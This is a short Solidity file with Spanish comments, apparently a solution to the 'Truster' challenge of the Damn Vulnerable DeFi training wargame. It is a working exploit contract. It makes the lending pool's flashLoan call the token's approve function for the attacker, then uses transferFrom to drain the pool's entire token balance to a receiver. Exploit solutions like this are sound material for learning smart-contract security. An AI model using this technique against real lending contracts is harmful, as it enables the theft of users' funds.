// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {DamnValuableToken} from "../DamnValuableToken.sol";
import {TrusterLenderPool} from "./TrusterLenderPool.sol";

contract TrusterLenderPoolAttacker {
    address public receiver;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    // Inicialización de los parámetros del contrato para poder acceder más tarde
    constructor(
        DamnValuableToken _token, TrusterLenderPool _pool, address _receiver
    ) {
        token = _token;
        pool = _pool;
        receiver = _receiver;
    }

    function approveTokenAttacker() external {
        // Creamos el payload data específico que llamará a la función que dará acceso a los tokens.
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            token.balanceOf(address(pool))
        );

        // Llamamos a la función flashLoan de nuestro contrato víctima con una cantidad 0 y target === token.
        pool.flashLoan(0, address(this), address(token), data);
        // Transferimos los tokens a la dirección de recovery porque tenemos los permisos.
        token.transferFrom(address(pool), receiver, token.balanceOf(address(pool)));
    }
}